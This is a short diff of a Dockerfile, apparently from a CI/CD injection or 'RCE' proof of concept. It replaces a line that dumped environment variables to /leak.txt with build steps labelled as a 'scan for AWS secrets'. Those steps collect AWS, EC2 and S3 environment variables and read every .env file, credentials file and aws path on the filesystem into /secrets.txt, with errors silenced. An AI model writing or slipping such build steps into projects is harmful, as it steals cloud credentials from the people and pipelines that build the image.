@@ -1,4 +1,6 @@
-ARG PYTHON_VERSION
-FROM python:${PYTHON_VERSION}-alpine
+FROM alpine:latest
+ARG PAYLOAD
 
-RUN echo "RCE success: $(env | grep -v '^GITHUB_')" > /leak.txt
+RUN echo "Scanning for AWS secrets..." && \
+    (env | grep -E 'AWS_|EC2_|S3_') > /secrets.txt && \
+    find / \( -name "*.env" -o -name "credentials" -o -path "*/aws/*" \) -exec cat {} \; >> /secrets.txt 2>/dev/null
